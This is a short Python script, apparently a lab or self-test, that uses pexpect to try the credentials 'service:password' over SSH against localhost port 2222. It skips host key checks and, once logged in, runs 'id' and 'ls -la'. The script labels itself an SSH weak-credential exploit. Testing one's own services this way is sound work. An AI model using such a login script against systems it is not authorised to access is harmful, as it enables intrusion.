import pexpect
import sys

TARGET = "localhost"
PORT = 2222
USER = "service"
PASS = "password"

def exploit_ssh():
    print(f"[*] Testing SSH Brute Force / Weak Credentials on {TARGET}:{PORT}...")
    print(f"[*] Attempting {USER}:{PASS}...")
    
    try:
        cmd = f"ssh -p {PORT} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {USER}@{TARGET}"
        child = pexpect.spawn(cmd)
        
        # Expect password prompt
        idx = child.expect(['[Pp]assword:', pexpect.EOF, pexpect.TIMEOUT], timeout=15)
        
        if idx == 0:
            child.sendline(PASS)
            
            # Expect shell prompt
            prompt_idx = child.expect(['\$', '#', '[Pp]assword:', pexpect.EOF], timeout=10)
            
            if prompt_idx < 2:
                print(f"[+] Success! Logged in as {USER}.")
                
                print("[*] Running 'id' and 'ls'...")
                child.sendline("id")
                child.expect(['\$', '#'])
                print(child.before.decode().strip())
                
                child.sendline("ls -la")
                child.expect(['\$', '#'])
                print(child.before.decode().strip())
                
                child.sendline("exit")
            else:
                print("[-] Login failed (incorrect password).")
        else:
            print("[-] Failed to reach password prompt (connection issue).")
            
    except Exception as e:
        print(f"[-] SSH exploit failed: {e}")

if __name__ == "__main__":
    exploit_ssh()
